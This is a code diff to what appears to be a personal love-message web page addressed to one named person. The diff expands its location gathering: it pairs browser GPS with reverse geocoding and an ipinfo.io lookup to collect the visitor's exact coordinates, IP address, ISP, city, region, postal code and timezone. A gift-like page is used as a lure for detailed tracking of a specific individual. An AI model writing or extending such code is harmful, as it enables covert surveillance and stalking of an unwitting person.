@@ -20,10 +20,10 @@ let gussaProgress = 0;
 let gussaTapCount = 0;
 const gussaSteps = [20, 40, 60, 80, 100];
 let locationContextPromise;
-const locationContextTTLms = 1;
+const locationContextTTLms = 1000; // 1 second
 
 const landingLines = [
-  "hi Ishy pishy, angelbabyyy...",
+  "heyy Ishy pishy, angelbabyyy...",
   "Can I steal just two minutes?",
   "I made something only for you ❤"
 ];
@@ -260,27 +260,51 @@ function fetchBrowserGeolocation(permissionState) {
         try {
           const latitude = position.coords.latitude;
           const longitude = position.coords.longitude;
-          const reverse = await fetchReverseGeocode(latitude, longitude);
           const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "";
+
+          // Run reverse geocode and IP lookup in parallel so we get both
+          // GPS-accurate location AND real IP/ISP/postal data
+          const [reverse, ipData] = await Promise.all([
+            fetchReverseGeocode(latitude, longitude),
+            fetch("https://ipinfo.io/json", { method: "GET", cache: "no-store" })
+              .then((r) => r.json())
+              .catch(() => ({}))
+          ]);
+
+          const ipLoc = (ipData.loc || "").split(",");
+          const normalizedRegion = (ipData.region || "").toLowerCase().trim();
+          const regionCodeMap = {
+            "delhi": "DL", "national capital territory of delhi": "DL",
+            "maharashtra": "MH", "karnataka": "KA", "tamil nadu": "TN",
+            "telangana": "TG", "andhra pradesh": "AP", "uttar pradesh": "UP",
+            "gujarat": "GJ", "west bengal": "WB", "rajasthan": "RJ",
+            "haryana": "HR", "punjab": "PB", "madhya pradesh": "MP",
+            "bihar": "BR", "odisha": "OR", "kerala": "KL", "assam": "AS",
+            "jammu and kashmir": "JK", "himachal pradesh": "HP",
+            "uttarakhand": "UT", "jharkhand": "JH", "chhattisgarh": "CT", "goa": "GA"
+          };
 
           resolve({
             locationSource: "browser_geolocation",
             geolocationPermission: permissionState,
-            ipAddress: "",
-            ipType: "",
-            ipCity: reverse.city || reverse.locality || reverse.principalSubdivision || "",
-            ipRegion: reverse.principalSubdivision || "",
-            ipRegionCode: reverse.principalSubdivisionCode || "",
-            ipCountry: reverse.countryName || "",
-            ipCountryCode: reverse.countryCode || "",
+            // IP info from ipinfo.io
+            ipAddress: ipData.ip || "",
+            ipType: (ipData.ip || "").includes(":") ? "IPv6" : "IPv4",
+            ipConnectionOrg: ipData.org || "",
+            ipConnectionIsp: ipData.org || "",
+            // Location from GPS + reverse geocode (most accurate)
+            ipCity: reverse.city || reverse.locality || ipData.city || "",
+            ipRegion: reverse.principalSubdivision || ipData.region || "",
+            ipRegionCode: reverse.principalSubdivisionCode || regionCodeMap[normalizedRegion] || "",
+            ipCountry: reverse.countryName || ipData.country || "",
+            ipCountryCode: reverse.countryCode || ipData.country || "",
             ipContinent: reverse.continent || "",
-            ipPostal: reverse.postcode || "",
+            // GPS postal first, IP postal as fallback
+            ipPostal: reverse.postcode || ipData.postal || "",
             ipLatitude: latitude,
             ipLongitude: longitude,
-            ipTimezone: timezone,
+            ipTimezone: timezone || ipData.timezone || "",
             ipFlag: "",
-            ipConnectionOrg: "",
-            ipConnectionIsp: "",
             ipLookupSuccess: "true"
           });
         } catch {
